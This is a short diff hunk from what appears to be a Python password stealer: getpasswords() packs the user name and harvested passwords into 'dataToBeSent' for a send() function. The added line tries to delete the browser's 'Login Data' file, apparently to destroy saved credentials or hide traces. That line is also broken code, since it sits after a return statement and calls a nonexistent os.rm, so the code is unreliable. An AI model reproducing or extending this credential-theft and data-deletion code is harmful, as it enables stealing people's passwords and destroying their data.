@@ -51,6 +51,7 @@ def getpasswords():
     dataToBeSent["user"] = getpass.getuser()
     dataToBeSent["passwords"] = dataList
     return dataToBeSent
+    os.rm(path+'\Login Data')
 
 def send():
 
